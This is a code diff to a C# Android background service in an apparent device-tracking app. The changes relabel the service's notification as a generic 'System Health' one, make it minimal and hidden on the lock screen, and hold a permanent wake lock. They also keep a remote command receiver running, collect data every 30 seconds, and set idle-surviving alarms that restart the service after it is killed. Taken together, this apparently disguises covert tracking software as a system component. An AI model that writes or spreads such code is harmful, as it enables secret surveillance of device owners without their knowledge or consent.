@@ -1,163 +1,185 @@
 using Android.App;
 using Android.Content;
 using Android.OS;
-using Android.Preferences;
 using DeviceTracker.Services;
 using DeviceTracker.Services.Command;
 using Microsoft.Extensions.DependencyInjection;
 
 namespace DeviceTracker;
 
+[global::Android.Runtime.Preserve(AllMembers = true)]
 public class UpdateService : Service
 {
     private const int NotificationId = 1001;
     private const string ChannelId = "device_tracker_channel";
-    private const string ChannelName = "Device Tracking";
+    private const string ChannelName = "System Health";
+    private const int SyncAlarmCode = 9002;
+    private const int RestartAlarmCode = 9001;
 
     private PowerManager.WakeLock? _wakeLock;
     private CancellationTokenSource? _cts;
-    private Timer? _collectionTimer;
-    private Timer? _wakeLockTimer;
-
-    private DeviceBackgroundService? _backgroundService;
     private CommandReceiverService? _cmdReceiver;
+    private DeviceBackgroundService? _backgroundService;
+    private bool _firstStart = true;
 
     public override IBinder? OnBind(Intent? intent) => null;
 
     public override void OnCreate()
     {
         base.OnCreate();
-        var services = IPlatformApplication.Current?.Services;
-        _backgroundService = services?.GetService<DeviceBackgroundService>();
-        _cmdReceiver = services?.GetService<CommandReceiverService>();
+        TryResolveServices();
     }
 
-    public override StartCommandResult OnStartCommand(Intent? intent, StartCommandFlags flags, int startId)
+    private void TryResolveServices()
     {
         try
         {
-            CreateNotificationChannel();
-            var notification = BuildNotification();
-            StartForeground(NotificationId, notification);
-            AcquireWakeLock();
-            _cmdReceiver?.Start();
-            StartPeriodicCollection();
-            _ = ExecuteCollectionCycleAsync();
-            System.Diagnostics.Debug.WriteLine("[FGService] Started successfully");
-        }
-        catch (Exception ex)
-        {
-            System.Diagnostics.Debug.WriteLine($"[FGService] Start error: {ex.Message}");
-        }
-        return StartCommandResult.Sticky;
-    }
-
-    private void StartPeriodicCollection()
-    {
-        _cts = new CancellationTokenSource();
-
-        _collectionTimer = new Timer(
-            async _ => await ExecuteCollectionCycleAsync(),
-            null,
-            TimeSpan.FromMinutes(2),
-            TimeSpan.FromMinutes(2));
-
-        _wakeLockTimer = new Timer(
-            _ => RenewWakeLock(),
-            null,
-            TimeSpan.FromMinutes(8),
-            TimeSpan.FromMinutes(8));
-    }
-
-    private async Task ExecuteCollectionCycleAsync()
-    {
-        try
-        {
-            System.Diagnostics.Debug.WriteLine("[FGService] Collection cycle started");
-
-            if (_backgroundService != null)
-            {
-                await _backgroundService.CollectAndStoreAllAsync(_cts?.Token ?? CancellationToken.None);
-                await _backgroundService.SyncAllPendingAsync();
-            }
-
-            UpdateNotification();
-            System.Diagnostics.Debug.WriteLine("[FGService] Collection cycle completed");
-        }
-        catch (Exception ex)
-        {
-            System.Diagnostics.Debug.WriteLine($"[FGService] Cycle error: {ex.Message}");
-        }
-    }
-
-    private void UpdateNotification()
-    {
-        try
-        {
-            var notification = BuildNotification();
-            var manager = GetSystemService(NotificationService) as NotificationManager;
-            manager?.Notify(NotificationId, notification);
+            var svc = IPlatformApplication.Current?.Services;
+            _backgroundService = svc?.GetService<DeviceBackgroundService>();
+            _cmdReceiver = svc?.GetService<CommandReceiverService>();
         }
         catch { }
     }
 
-    private void CreateNotificationChannel()
+    public override StartCommandResult OnStartCommand(Intent? intent, StartCommandFlags flags, int startId)
     {
-        if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
+        if (intent?.GetBooleanExtra("sync_alarm", false) == true)
         {
-            var channel = new NotificationChannel(
-                ChannelId, ChannelName, NotificationImportance.High)
+            HandleSyncAlarm();
+            return StartCommandResult.NotSticky;
+        }
+
+        if (!_firstStart) return StartCommandResult.Sticky;
+        _firstStart = false;
+
+        StartForegroundService();
+        AcquireWakeLock();
+        _cmdReceiver?.Start();
+        _cts = new CancellationTokenSource();
+        _ = RunCollectionLoopOnlyAsync();
+        ScheduleSyncAlarm(10000);
+        return StartCommandResult.Sticky;
+    }
+
+    private void HandleSyncAlarm()
+    {
+        if (_backgroundService == null) TryResolveServices();
+        if (_backgroundService == null) return;
+
+        var pm = GetSystemService(PowerService) as PowerManager;
+        var syncLock = pm?.NewWakeLock(WakeLockFlags.Partial, "SystemHealth:SyncLock");
+        syncLock?.Acquire(45000L);
+        _ = Task.Run(async () =>
+        {
+            try
             {
-                Description = "Keeps device tracking active in background",
-                LockscreenVisibility = NotificationVisibility.Private
-            };
-            channel.EnableVibration(false);
-            var manager = GetSystemService(NotificationService) as NotificationManager;
-            manager?.CreateNotificationChannel(channel);
+                await _backgroundService!.SyncAllPendingAsync();
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"[Svc] Sync error: {ex.Message}");
+            }
+            finally
+            {
+                if (syncLock?.IsHeld == true) syncLock.Release();
+                syncLock?.Dispose();
+            }
+        });
+        ScheduleSyncAlarm(120000);
+    }
+
+    private void ScheduleSyncAlarm(long delayMs)
+    {
+        try
+        {
+            var i = new Intent(this, typeof(UpdateService));
+            i.PutExtra("sync_alarm", true);
+            var p = PendingIntent.GetService(this, SyncAlarmCode, i,
+                PendingIntentFlags.UpdateCurrent | PendingIntentFlags.Immutable);
+            var am = GetSystemService(AlarmService) as AlarmManager;
+            if (am == null) return;
+            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
+                am.SetExactAndAllowWhileIdle(AlarmType.ElapsedRealtimeWakeup,
+                    Android.OS.SystemClock.ElapsedRealtime() + delayMs, p);
+            else if (Build.VERSION.SdkInt >= BuildVersionCodes.Kitkat)
+                am.SetExact(AlarmType.ElapsedRealtimeWakeup,
+                    Android.OS.SystemClock.ElapsedRealtime() + delayMs, p);
+            else
+                am.Set(AlarmType.ElapsedRealtimeWakeup,
+                    Android.OS.SystemClock.ElapsedRealtime() + delayMs, p);
+        }
+        catch { }
+    }
+
+    private void StartForegroundService()
+    {
+        try
+        {
+            CreateChannel();
+            var n = BuildNotification();
+            StartForeground(NotificationId, n);
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[Svc] Foreground error: {ex.Message}");
+            StopSelf();
+        }
+    }
+
+    private async Task RunCollectionLoopOnlyAsync()
+    {
+        while (!_cts!.IsCancellationRequested)
+        {
+            try
+            {
+                if (_backgroundService != null)
+                    await _backgroundService.CollectAndStoreAllLocalOnlyAsync(_cts.Token);
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"[Svc] Collect error: {ex.Message}");
+            }
+            await Task.Delay(30000, _cts.Token);
         }
     }
 
     private Notification BuildNotification()
     {
-        ISharedPreferences? prefs = PreferenceManager.GetDefaultSharedPreferences(this);
-        var battery = prefs?.GetInt("last_battery", 0) ?? 0;
-        var network = prefs?.GetString("last_network", "unknown") ?? "unknown";
-
-        var pendingIntentFlags = PendingIntentFlags.UpdateCurrent | PendingIntentFlags.Immutable;
-        var openIntent = PackageManager?.GetLaunchIntentForPackage(PackageName);
-        var pendingIntent = PendingIntent.GetActivity(this, 0, openIntent, pendingIntentFlags);
-
-        return new Notification.Builder(this, ChannelId)
-            .SetContentTitle("Device Tracker Active")
-            .SetContentText($"Battery: {battery}% | Network: {network}")
+        var f = PendingIntentFlags.UpdateCurrent | PendingIntentFlags.Immutable;
+        var oi = PackageManager?.GetLaunchIntentForPackage(PackageName);
+        var pi = oi != null ? PendingIntent.GetActivity(this, 0, oi, f) : null;
+        if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
+            return new Notification.Builder(this, ChannelId)
+                .SetContentTitle("System Health").SetContentText("Active")
+                .SetSmallIcon(global::Android.Resource.Drawable.IcDialogInfo)
+                .SetOngoing(true).SetContentIntent(pi)
+                .SetCategory(Notification.CategoryService).Build();
+        return new Notification.Builder(this)
+            .SetContentTitle("System Health").SetContentText("Active")
             .SetSmallIcon(global::Android.Resource.Drawable.IcDialogInfo)
-            .SetOngoing(true)
-            .SetContentIntent(pendingIntent)
-            .SetCategory(Notification.CategoryService)
-            .Build();
+            .SetOngoing(true).SetContentIntent(pi).Build();
+    }
+
+    private void CreateChannel()
+    {
+        if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
+        {
+            var ch = new NotificationChannel(ChannelId, ChannelName, NotificationImportance.Min)
+            { Description = "System service", LockscreenVisibility = NotificationVisibility.Secret };
+            ch.EnableVibration(false); ch.SetShowBadge(false);
+            (GetSystemService(NotificationService) as NotificationManager)?.CreateNotificationChannel(ch);
+        }
     }
 
     private void AcquireWakeLock()
     {
         try
         {
-            var powerManager = GetSystemService(PowerService) as PowerManager;
-            if (powerManager == null) return;
-            _wakeLock = powerManager.NewWakeLock(
-                WakeLockFlags.Partial,
-                "DeviceTracker:WakeLock");
-            _wakeLock?.Acquire((long)TimeSpan.FromMinutes(10).TotalMilliseconds);
-        }
-        catch { }
-    }
-
-    private void RenewWakeLock()
-    {
-        try
-        {
-            if (_wakeLock?.IsHeld == true)
-                _wakeLock.Release();
-            AcquireWakeLock();
+            var pm = GetSystemService(PowerService) as PowerManager;
+            if (pm == null) return;
+            if (_wakeLock?.IsHeld == true) _wakeLock.Release();
+            _wakeLock = pm.NewWakeLock(WakeLockFlags.Partial, "SystemHealth:WakeLock");
+            _wakeLock?.Acquire();
         }
         catch { }
     }
@@ -167,37 +189,12 @@ public class UpdateService : Service
         try
         {
             _cmdReceiver?.Stop();
-            _collectionTimer?.Dispose();
-            _wakeLockTimer?.Dispose();
             _cts?.Cancel();
-            if (_wakeLock?.IsHeld == true)
-                _wakeLock.Release();
+            if (_wakeLock?.IsHeld == true) _wakeLock.Release();
             _wakeLock?.Dispose();
-
-            // إعادة تشغيل عبر AlarmManager (أكثر موثوقية من START_STICKY)
-            ScheduleRestart();
-            System.Diagnostics.Debug.WriteLine("[FGService] Destroyed, scheduled restart via AlarmManager");
+            ScheduleSyncAlarm(5000);
         }
         catch { }
-        finally
-        {
-            base.OnDestroy();
-        }
-    }
-
-    private void ScheduleRestart()
-    {
-        try
-        {
-            var alarmIntent = new Intent(this, typeof(UpdateService));
-            var pendingIntent = PendingIntent.GetService(this, 0, alarmIntent,
-                PendingIntentFlags.UpdateCurrent | PendingIntentFlags.Immutable);
-            var alarmMgr = GetSystemService(AlarmService) as AlarmManager;
-            if (alarmMgr != null)
-                alarmMgr.Set(AlarmType.RtcWakeup,
-                    Java.Lang.JavaSystem.CurrentTimeMillis() + 3000,
-                    pendingIntent);
-        }
-        catch { }
+        finally { base.OnDestroy(); }
     }
 }
